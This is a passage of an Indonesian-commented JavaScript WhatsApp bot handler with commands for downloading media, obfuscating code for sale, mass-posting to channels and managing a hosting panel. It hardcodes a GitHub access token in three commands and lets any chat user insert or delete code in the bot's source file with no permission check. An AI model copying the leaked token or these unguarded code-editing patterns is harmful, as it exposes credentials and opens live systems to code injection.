await cupen.sendMessage(m.chat, { document: Buffer.from(jsonContent, 'utf-8'), fileName: 'index.html', mimetype: 'text/html' }, { quoted: m, caption: 'Sukses Fetching' });
    } catch (e) {
        return m.reply(e.toString());
    }
}
break;

case 'woy':case 'p':m.reply(`Halo! aku menggunakan script dari ❀SalwaCantik❀`)
break


case "play": {
if (!isCreator) return m.reply('You do not have permission to access this feature.');
if (!text) return m.reply(example("dj tiktok"))
await cupen.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await cupen.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await cupen.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case 'backup':{
if (!isCreator) return m.reply('You do not have permission to access this feature.');
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await cupen.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break        

case 'tourl': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
if (!quoted) return m.reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
let q = m.quoted ? m.quoted : m
cupen.sendMessage(from, {
react: {
text: '🎁',
key: m.key
}
});
let media = await q.download()
let uploadImage = require('./serverside/libary/catmoe')
let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
let link = await (isTele ? uploadImage : uploadFile)(media)
m.reply(`Your Link : ${link}\nExpired Date : Liftime`)
}
break
case 'spotify':
   if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');    
  if (!text) return m.reply(`Urlnya mana?\n*Contoh:* ${prefix + command} https://open.spotify.com/track/xxxxxx`)
  cupen.sendMessage(m.chat, { react: { text: '👒', key: m.key }})
  let urlSpo = linkRegex.test(text)
  if (!urlSpo) return m.reply(`Hanya Support Url Track *(music)*\n*Contoh Url:* https://open.spotify.com/track/xxxxxx`)
  let response = await spotifyDown(text)
  let { nama, title, durasi, thumb, url } = response
  
  if (response) {
  let cap = `*© 𝖲𝗉𝗈𝗍𝗂𝖿𝗒 𝖬𝗎𝗌𝗂𝖼*

*[🏷️] Info Music*
* *Title:* ${title}
* *Durasi:* ${durasi}
* *Artis:* ${nama}
* *Spotify:* ${text}

\`Kamu Dapat Mencari Music Spotify\`\n*Caranya:* ${prefix}spotisearch <music name>`
  await cupen.sendMessage(m.chat, { text: cap, contextInfo: { mentionedJid: [m.sender], externalAdReply: { mediaUrl: '', mediaType: 1, title: title, body: '© ❀SalwaCantik❀', thumbnailUrl: thumb, sourceUrl: '', renderLargerThumbnail: true, showAdAttribution: false } } }, { quoted: m });
 cupen.sendMessage(m.chat, { audio: { url: url }, mimetype: 'audio/mp4' }, { quoted: m })
  } else {
     m.m.reply(eror)
    }
  break
        
case 'tiktok': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
async function tiktok(query) {
 return new Promise(async (resolve, reject) => {
 try {
 const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

 const response = await axios({
 method: 'POST',
 url: 'https://tikwm.com/api/',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Cookie': 'current_language=en',
 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
 },
 data: encodedParams
 });
 const videos = response.data.data;
 const result = {
 title: videos.title,
 cover: videos.cover,
 origin_cover: videos.origin_cover,
 no_watermark: videos.play,
 watermark: videos.wmplay,
 music: videos.music
 };
 resolve(result);
 } catch (error) {
 reject(error);
 }
 });
}
if (args.length == 0) return m.reply(`☘️ *Link Tiktoknya Mana?*`)
if (!isUrl(args[0])) return m.reply('⚠️ *Itu Bukan Link Yang Benar*')
m.reply(mess.wait)
let cap = ``
let res = await tiktok(`${args[0]}`)
cupen.sendMessage(m.chat, { video: { url: res.no_watermark }, caption: cap, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
cupen.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
})
}
break
case 'clear': {
if (!isCreator) return m.reply('You do not have permission to access this feature.');
                fs.readdir("./sessionserver", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return m.reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return m.reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    m.reply(teks)
                    await sleep(2000)
                    m.reply("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./sessionserver/${file}`)
                    });
                    await sleep(2000)
                    m.reply("Successfully deleted all the trash in the session folder")
                });
            }
            break

     
case 'self': {
if (!isCreator) return m.reply('You do not have permission to access this feature.')
cupen.public = false
m.reply(`Succes switch mode bot sekarang mode self`)
}
break

case 'public': {
if (!isCreator) return m.reply('You do not have permission to access this feature')
cupen.public = true
m.reply(`Succes switch mode bot sekarang mode public`)
}
break

case 'decrypt':
    if (!isPrem) return m.reply('*You do not have permission to access this feature.*');
    if (!text) return m.reply('Mana textnya');
    const memek = await deobfuscate(text);
    const water = `/*\n * Deobfuscated By ❀SalwaCantik❀\n * Buy Script Pv me\n*/\n\n`;
    const lastt = water + memek; 
    await cupen.sendMessage(m.chat, { 
        document: Buffer.from(lastt, 'utf-8'), 
        fileName: 'deobfuscated_code.js', 
        mimetype: 'application/javascript' 
    }, { quoted: m, caption: 'Sukses Deobfuscation' });

    break;
case 'encrypt':
    if (!isPrem) return m.reply('*Khusus premium atau developer bot.*');
    if (!text) return m.reply('Mana textnya');

    // Proses deobfuscation
    const kkkk = await EncryptJs(text);

    // Pastikan hasilDeobfuscate adalah string dan hapus tanda kutip di awal dan akhir
    const cleanResult = kkkk.replace(/^"|"$/g, ''); // Menghapus tanda kutip di awal dan akhir

    // Tambahkan watermark di awal hasil
    const watermark = `/*\n * Obfuscated By ❀SalwaCantik❀\n * Buy Script Pv me\n\n*/\n\n`;
    const finalResult = watermark + cleanResult; // Gabungkan watermark dengan hasil asli

    // Mengirim hasil sebagai file JavaScript
    await cupen.sendMessage(m.chat, { 
        document: Buffer.from(finalResult, 'utf-8'), 
        fileName: 'obfuscated_code.js', // Nama file yang akan dikirim
        mimetype: 'application/javascript' // MIME type untuk JavaScript
    }, { quoted: m, caption: 'Suksess' });

    break;
case 'mediafire':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 async function mediafiredll(url) {
 try {
 // Mengubah URL agar dapat diterjemahkan melalui layanan proxy
 const res = await axios.get(`https://www-mediafire-com.translate.goog/${url.replace('https://www.mediafire.com/', '')}?_x_tr_sl=en&_x_tr_tl=fr&_x_tr_hl=en&_x_tr_pto=wapp`);
 const $ = cheerio.load(res.data);
 
 // Mengambil data file dari halaman Mediafire
 const fileurl = $('#downloadButton').attr('href');
 const filename = $('body > main > div.content > div.center > div > div.dl-btn-cont > div.dl-btn-labelWrap > div.promoDownloadName.notranslate > div')
 .attr('title')
 .replace(/\s+/g, '') // Menghapus semua spasi dan newline
 .trim(); // Membersihkan spasi ekstra

 const date = $('body > main > div.content > div.center > div > div.dl-info > ul > li:nth-child(2) > span').text().trim();
 const filesize = $('#downloadButton').text()
 .replace('Download', '')
 .replace(/[()]/g, '') // Menghapus tanda kurung
 .replace(/\s+/g, '') // Menghapus spasi berlebih
 .trim(); 

 // Mendapatkan tipe file dari header HTTP
 const rese = await axios.head(fileurl);
 const filetype = rese.headers['content-type'];

 return { filename, filesize, date, filetype, fileurl };
 } catch (err) {
 console.error('Error fetching Mediafire details:', err);
 throw new Error('Gagal mendapatkan detail file dari Mediafire.');
 }
 }

 // Cek apakah input URL diberikan
 let inputExample = `*Contoh*: ${prefix + command} https://www.mediafire.com/file/xxxxxxx`;
 if (!text) return m.reply(inputExample);

 try {
 // Ambil detail file
 const dataJson = await mediafiredll(text);
 const { filename, filesize, date, filetype, fileurl } = dataJson;

 // Memastikan ukuran file tidak melebihi batas 100 MB
 if (parseFloat(filesize.split('MB')[0]) >= 100) {
 return m.reply('*File terlalu besar! Maksimal ukuran adalah 100 MB.*');
 }

 await sleep(500); // Menunggu sejenak untuk pengalaman pengguna yang lebih baik

 // Format pesan informasi file
 const caption = `≡ *MEDIAFIRE*

▢ *Nama* : ${filename}
▢ *Ukuran* : ${filesize}
▢ *Tipe* : ${filetype}
▢ *Diunggah* : ${date}`;

 // Kirim file sebagai dokumen ke pengguna
 await cupen.sendMessage(
 m.chat, 
 { 
 document: { url: fileurl }, 
 fileName: filename, 
 caption: caption, 
 mimetype: filetype 
 }, 
 { quoted: m }
 );
 } catch (err) {
 m.reply(`Terjadi kesalahan: ${err.message}`);
 }
}
break;

case "jpmchfoto": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply("Teks Dan Foto Nya Mana Mas ❀SalwaCantik❀?");
    if (!/image/.test(mime)) return m.reply("Salah Mas ❀SalwaCantik❀ Foto Sama Teks Nya Mana?");
    
    let image = await cupen.downloadAndSaveMediaMessage(qmsg);
    const daftarSaluran = [
        "120363326439706177@newsletter",
        "120363293691624662@newsletter",
        "120363351572746964@newsletter",
        "120363312383238112@newsletter",
        "120363318521671268@newsletter",
        "120363339655411756@newsletter",
        "120363318195685462@newsletter",
        "120363317590567007@newsletter",
        "120363323927211654@newsletter",
        "120363349663089430@newsletter",
        "120363323927211654@newsletter",
        "120363305121469207@newsletter",
        "120363330289360382@newsletter",
        "120363377528029023@newsletter",
        "120363374437613386@newsletter",
        "120363325357770847@newsletter",
        "120363376340672180@newsletter",
    ];
    let total = 0;

    m.reply(`Proses Mas ❀SalwaCantik❀ Mengirim Teks & Foto Ke ${daftarSaluran.length} Saluran...`);
    
    for (const idSaluran of daftarSaluran) {
        try {
            await cupen.sendMessage(idSaluran, {
                image: await fs.readFileSync(image),
                caption: text,
                contextInfo: { forwardingScore: 1, isForwarded: true },
            });
            total++;
        } catch (err) {
            console.error(`Duh Gagal Kirim ke saluran ${idSaluran}:`, err);
        }
        await sleep(global.delayJpm); // Delay antara pesan
    }

    await fs.unlinkSync(image);
    m.reply(`Done Tuanku 🥶 ${total} Saluran`);
}
break;

case 'adddb':
{
 if (!q) return m.reply('❌ Anda harus mengirimkan nomor yang akan ditambahkan ke database.');

 const phoneNumber = q.trim(); // Nomor yang ingin ditambahkan
 const GITHUB_TOKEN = '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'; // Ganti dengan token GitHub Anda
 const REPO_OWNER = 'AANCODE444'; // Ganti dengan username GitHub Anda
 const REPO_NAME = 'Aan-V4'; // Ganti dengan nama repositori Anda
 const FILE_PATH = 'dtbs.json'; // Path ke file JSON di repositori Anda

 try {
 // Ambil data JSON dari GitHub
 const response = await fetch(`https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`);
 const jsonData = await response.json();

 // Validasi apakah data sudah ada
 if (!jsonData || !jsonData.data || !Array.isArray(jsonData.data)) {
 return m.reply('❌ Struktur data tidak valid.');
 }

 // Cek apakah nomor sudah ada di database
 if (jsonData.data.includes(phoneNumber)) {
 return m.reply(`❌ Nomor ${phoneNumber} sudah ada di database.`);
 }

 // Tambahkan nomor baru ke array data
 jsonData.data.push(phoneNumber); // Nomor ditambahkan di akhir array

 // Encode data JSON menjadi base64 untuk diupload ke GitHub
 const updatedData = JSON.stringify(jsonData, null, 2); // Format JSON dengan indentation 2 spasi
 const base64Content = Buffer.from(updatedData).toString('base64'); // Encode ke base64

 // Ambil SHA dari file GitHub yang ada
 const shaResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`);
 const shaData = await shaResponse.json();
 const currentSHA = shaData.sha; // SHA file yang ada

 // Update file di GitHub
 const updateResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
 method: 'PUT',
 headers: {
 'Authorization': `Bearer ${GITHUB_TOKEN}`,
 'Content-Type': 'application/json',
 },
 body: JSON.stringify({
 message: `Menambahkan nomor ${phoneNumber} ke database`,
 content: base64Content,
 sha: currentSHA, // SHA file yang ada
 }),
 });

 const updateResult = await updateResponse.json();

 if (updateResponse.status === 200) {
 return m.reply(`✅ Nomor ${phoneNumber} berhasil ditambahkan ke database.`);
 } else {
 throw new Error(`Error menambahkan nomor: ${updateResult.message}`);
 }

 } catch (error) {
 console.error(error);
 return m.reply(`❌ Error: ${error.message}`);
 }
}
break;



case 'listdb':
{
 const GITHUB_TOKEN = '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'; // Ganti dengan token GitHub Anda
 const REPO_OWNER = 'AANCODE444'; // Ganti dengan username GitHub Anda
 const REPO_NAME = 'Aan-V4'; // Ganti dengan nama repositori Anda
 const FILE_PATH = 'dtbs.json'; // Path ke file JSON di repositori Anda

 try {
 // Ambil data JSON dari GitHub
 const response = await fetch(`https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`);
 const jsonData = await response.json();

 // Validasi apakah data sudah ada
 if (!jsonData || !jsonData.data || !Array.isArray(jsonData.data)) {
 return m.reply('❌ Struktur data tidak valid.');
 }

 // Tampilkan daftar nomor yang ada di database
 const nomorList = jsonData.data.join('\n');
 return m.reply(`📋 Daftar Nomor dalam Database:\n${nomorList}`);

 } catch (error) {
 console.error(error);
 return m.reply(`❌ Error: ${error.message}`);
 }
}
break;


case 'deldb':
{
 if (!q) return m.reply('❌ Anda harus mengirimkan nomor yang akan dihapus dari database.');

 const phoneNumber = q.trim(); // Nomor yang akan dihapus
 const GITHUB_TOKEN = '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'; // Ganti dengan token GitHub Anda
 const REPO_OWNER = 'AANCODE444'; // Ganti dengan username GitHub Anda
 const REPO_NAME = 'Aan-V4'; // Ganti dengan nama repositori Anda
 const FILE_PATH = 'dtbs.json'; // Path ke file JSON di repositori Anda

 try {
 // Ambil data JSON dari GitHub
 const response = await fetch(`https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`);
 const jsonData = await response.json();

 // Validasi apakah data sudah ada
 if (!jsonData || !jsonData.data || !Array.isArray(jsonData.data)) {
 return m.reply('❌ Struktur data tidak valid.');
 }

 // Cek apakah nomor ada di database
 if (!jsonData.data.includes(phoneNumber)) {
 return m.reply(`❌ Nomor ${phoneNumber} tidak ditemukan di database.`);
 }

 // Hapus nomor dari array data
 jsonData.data = jsonData.data.filter(number => number !== phoneNumber);

 // Encode data JSON menjadi base64 untuk diupload ke GitHub
 const updatedData = JSON.stringify(jsonData, null, 2);
 const base64Content = Buffer.from(updatedData).toString('base64');

 // Ambil SHA dari file GitHub yang ada
 const shaResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`);
 const shaData = await shaResponse.json();
 const currentSHA = shaData.sha;

 // Update file di GitHub
 const updateResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
 method: 'PUT',
 headers: {
 'Authorization': `Bearer ${GITHUB_TOKEN}`,
 'Content-Type': 'application/json',
 },
 body: JSON.stringify({
 message: `Menghapus nomor ${phoneNumber} dari database`,
 content: base64Content,
 sha: currentSHA, // SHA file yang ada
 }),
 });

 const updateResult = await updateResponse.json();

 if (updateResponse.status === 200) {
 return m.reply(`✅ Nomor ${phoneNumber} berhasil dihapus dari database.`);
 } else {
 throw new Error(`Error menghapus nomor: ${updateResult.message}`);
 }

 } catch (error) {
 console.error(error);
 return m.reply(`❌ Error: ${error.message}`);
 }
}
break;

case 'addprem': {
if (!isCreator) return m.reply('Khusus developer')
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return m.reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return m.reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
} else {
var cekap = await cupen.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
}}
break
case 'renamecase':
    if (!q) return m.reply('Format tidak valid. Contoh: renamecase izintes|izintesnew');
    if (!isCreator) return m.reply('Khusus owner');

    // Pisahkan input menjadi nama case lama dan nama case baru
    const [oldCaseName, newCaseName] = q.split('|').map(name => name.trim());

    if (!oldCaseName || !newCaseName) {
        return m.reply('Format tidak valid. Contoh: renamecase izintes|izintesnew');
    }

    // Path ke file yang berisi switch-case
    const rinembos = path.join(__dirname, 'cupen.js');

    try {
        // Baca file secara sinkron
        let data = fs.readFileSync(rinembos, 'utf8');

        // Ekspresi reguler untuk mencari case berdasarkan nama lama
        const caseRegex = new RegExp(`case\\s+'${oldCaseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);

        if (startIndex === -1) {  // Perbaikan dari - menjadi -1
            return m.reply(`Case '${oldCaseName}' tidak ditemukan.`);
        }

        // Cari case berikutnya setelah case yang dicari
        const nextCasePattern = /case\s+/g;  // Perbaikan ekspresi reguler
        nextCasePattern.lastIndex = startIndex + 1;
        const nextCaseMatch = nextCasePattern.exec(data);

        // Update nama case
        const updatedData = data.replace(caseRegex, `case '${newCaseName}':`);
        
        // Tulis kembali ke file
        fs.writeFileSync(rinembos, updatedData, 'utf8');
        m.reply(`Case '${oldCaseName}' sukses menjadi '${newCaseName}'!`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat membaca atau menulis file.');
    }
    break;
    case 'editcase':
    if (!q) return m.reply('Mana case yang ingin diedit? Format: .editcase case \'namafitur\':\n\n<kode baru>');
    if (!isCreator) return m.reply('Khusus owner');

    const caseNameRegex = /case\s+'([^']+)':/; 
    const match = q.match(caseNameRegex);

    if (!match) {
        return m.reply('Format tidak benar. Contoh: .editcase case \'namafitur\':\n\n<kode baru>');
    }

    const caseName = match[1]; 
    const newCode = q.replace(caseNameRegex, '').trim(); 

   
    const filenyabang = path.join(__dirname, 'cupen.js');

    try {
        
        let data = fs.readFileSync(filenyabang, 'utf8');
        const caseRegex = new RegExp(`case\\s+'${caseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);

        if (startIndex !== -1) {
            let endIndex = -1;
            const breakPattern = /break\s*;/g;
            breakPattern.lastIndex = startIndex;
            const breakMatch = breakPattern.exec(data);

            if (breakMatch) {
                endIndex = breakMatch.index + breakMatch[0].length;
            }

           
            const nextCasePattern = /case\s+'/g;
            nextCasePattern.lastIndex = startIndex + 1;
            const nextCaseMatch = nextCasePattern.exec(data);

            if (nextCaseMatch && (endIndex === -1 || nextCaseMatch.index < endIndex)) {
                endIndex = nextCaseMatch.index;
            }

            if (endIndex !== -1) {
                const updatedCode = `case '${caseName}':\n${newCode}\n`;
                data = data.slice(0, startIndex) + updatedCode + data.slice(endIndex);
                fs.writeFileSync(filenyabang, data, 'utf8');
                m.reply(`Succesfully update case ${q}!`);
            } else {
                m.reply('Maaf, tidak ditemukan akhir yang jelas untuk case tersebut.');
            }
        } else {
            m.reply('Sorry, case nya gada di file cupen.js');
        }
    } catch (err) {
        console.error(err);
        m.reply('Eror, silahkan cek console untuk lihat apa yang eror');
    }
    break;
    case 'getfunc':
    if (!isCreator) return m.reply('Khusus owner');
    
    const cupencoder = path.join(__dirname, 'cupen.js');
    
    try {
        const data = fs.readFileSync(cupencoder, 'utf8');
        
        if (!q) {
           
            const funcRegex = /async function (\w+)\s*\([^)]*\)\s*{/g;
            let functionsList = [];
            let match;

            
            while ((match = funcRegex.exec(data)) !== null) {
                functionsList.push(match[1]); 
            }

            if (functionsList.length > 0) {

                m.reply(`Mau cari function apa?\n\n${functionsList.map((func, index) => `${index + 1}. ${func}`).join('\n')}`);
            } else {
                m.reply('Tidak ada async function yang ditemukan.');
            }
            return; 
        }

        
        const funcRegex = new RegExp(`async function ${q}\\s*\\([^)]*\\)\\s*{`, 'g');
        const startIndex = data.search(funcRegex);
        
        if (startIndex !== -1) {
            let openBrackets = 0;
            let endIndex = startIndex;
            for (let i = startIndex; i < data.length; i++) {
                if (data[i] === '{') {
                    openBrackets++;
                } else if (data[i] === '}') {
                    openBrackets--;
                    if (openBrackets === 0) {
                        endIndex = i;
                        break;
                    }
                }
            }
            
            const extrakbang = data.slice(startIndex, endIndex + 1);
            m.reply(`*YOUR FUNCTION*:\n\n${extrakbang}`);
        } else {
            m.reply('Nama func nya gada bro, coba cari lain');
        }
    } catch (err) {
        console.error(err);
        m.reply('Error! cek console mu.');
    }
    break;
case 'addcase': {
if (!text) return m.reply(`Contoh: ${prefix+command} case nya`);
const namaFile = path.join(__dirname, 'cupen.js');
const caseBaru = `${text}\n\n`;
const tambahCase = (data, caseBaru) => {
const posisiDefault = data.lastIndexOf("default:");
if (posisiDefault !== -1) {
const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahCase(data, caseBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan case baru:');
console.log(caseBaru);
return m.reply('Sukses menambahkan case!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break            
case 'delcase': {
if (!text) return m.reply(`Contoh: ${prefix+command} nama case`);
const fs = require('fs').promises;
async function dellCase(filePath, caseNameToRemove) {
try {
let data = await fs.readFile(filePath, 'utf8');
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
if (data === modifiedData) {
m.reply('Case tidak ditemukan atau sudah dihapus.');
return;
}
await fs.writeFile(filePath, modifiedData, 'utf8');
m.reply('Sukses menghapus case!');
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}}
dellCase('./cupen.js', q);
break;
}
        
        case 'getcase':
    if (!q) return m.reply('Mana nama case yang ingin diambil?');
   if (!isCreator) return m.reply('Khusus owner')
    // Path ke file yang berisi switch-case
    const filePath = path.join(__dirname, 'cupen.js');
    
    try {
        // Baca file secara sinkron
        const data = fs.readFileSync(filePath, 'utf8');
        
        // Ekspresi reguler untuk mencari case berdasarkan nama
        const caseRegex = new RegExp(`case\\s+'${q}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);
        
        if (startIndex !== -1) {
            let endIndex = -1;
            const breakPattern = /break\s*;/g;
            breakPattern.lastIndex = startIndex;
            const breakMatch = breakPattern.exec(data);
            
            if (breakMatch) {
                endIndex = breakMatch.index + breakMatch[0].length;
            }
            
            // Cari case berikutnya setelah case yang dicari
            const nextCasePattern = /case\s+'/g;
            nextCasePattern.lastIndex = startIndex + 1;
            const nextCaseMatch = nextCasePattern.exec(data);
            
            if (nextCaseMatch && (endIndex === -1 || nextCaseMatch.index < endIndex)) {
                endIndex = nextCaseMatch.index;
            }
            
            if (endIndex !== -1) {
                // Ekstrak isi case
                const caseCode = data.slice(startIndex, endIndex);
                m.reply(`Nih case:\n\n${caseCode}`);
            } else {
                // Jika tidak ditemukan batas akhir
                m.reply('Maaf, tidak ditemukan akhir yang jelas untuk case tersebut.');
            }
        } else {
            // Jika case tidak ditemukan, kirimkan pesan
            m.reply('Maaf, case tidak ada dalam file cupen.js');
        }
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat membaca file.');
    }
    break;



case 'delprem': {
if (!isCreator) return m.reply('Khusus developer')
if (!args[0]) return m.reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./serverside/system/premium.json', JSON.stringify(premium))
m.reply('Sukses!')
} else {
var cekpr = await cupen.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./serverside/system/premium.json', JSON.stringify(premium))
m.reply('Sukses!')
}}
break




case 'encryptv2':
    if (!isPrem) return m.reply('*Khusus premium atau developer bot.*');
    if (!text) return m.reply('Mana textnya');
    // Proses deobfuscation
    const kkkkk = await EncryptJs2(text);

    // Pastikan hasilDeobfuscate adalah string dan hapus tanda kutip di awal dan akhir
    const cleanResulti = kkkkk.replace(/^"|"$/g, ''); // Menghapus tanda kutip di awal dan akhir

    // Tambahkan watermark di awal hasil
    const watermarkk = `/*\n * Obfuscated By ❀SalwaCantik❀\n * Buy Script Pv me\n\n*/\n\n`;
    const utm = watermarkk + cleanResulti; // Gabungkan watermark dengan hasil asli

    // Mengirim hasil sebagai file JavaScript
    await cupen.sendMessage(m.chat, { 
        document: Buffer.from(utm, 'utf-8'), 
        fileName: 'obfuscated_code.js', // Nama file yang akan dikirim
        mimetype: 'application/javascript' // MIME type untuk JavaScript
    }, { quoted: m, caption: 'Suksess' });

    break;
case 'upcapikey':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text; // Dapatkan teks dari pesan yang dibalas atau input

 // Update global capikey dengan nilai baru
 global.capikey = newteks;

 // Kirim balasan bahwa capikey telah berhasil diganti
 await cupen.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" }, { quoted: m });
 } else {
 // Jika format salah, kirimkan pesan contoh format yang benar
 await cupen.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
 }
}
break;
case 'deladmin':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!args[0]) return m.reply(`Untuk melihat ID silahkan ketik ${prefix}listadmin`);
 
 let cek = await fetch(domain + "/api/application/users?page=1", {
 "method": "GET",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });

 let res2 = await cek.json();
 let users = res2.data;
 let getid = null;
 let idadmin = null;

 // Loop users untuk cari admin yang sesuai dengan ID
 for (let e of users) {
 if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
 getid = e.attributes.username;
 idadmin = e.attributes.id;

 try {
 let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
 "method": "DELETE",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });

 // Cek apakah penghapusan admin berhasil
 if (!delusr.ok) {
 throw new Error('Gagal menghapus admin!');
 }

 m.reply(`Berhasil menghapus admin panel *${getid}*`);
 } catch (err) {
 console.error(err);
 m.reply(`❌ Terjadi kesalahan saat mencoba menghapus admin: ${err.message}`);
 }
 break; // Keluar dari loop setelah berhasil
 }
 }

 // Jika admin tidak ditemukan
 if (idadmin == null) {
 m.reply("ID admin tidak ditemukan atau admin tidak valid!");
 }
}
break

case 'delserver':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let srv = args[0]; // ID server yang ingin dihapus
 if (!srv) return m.reply('ID servernya mana?');

 try {
 let f = await fetch(domain + "/api/application/servers/" + srv, {
 "method": "DELETE",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus server!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'Server tidak ditemukan!';
 m.reply(`❌ Gagal menghapus server: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus server.');
 }
}
break

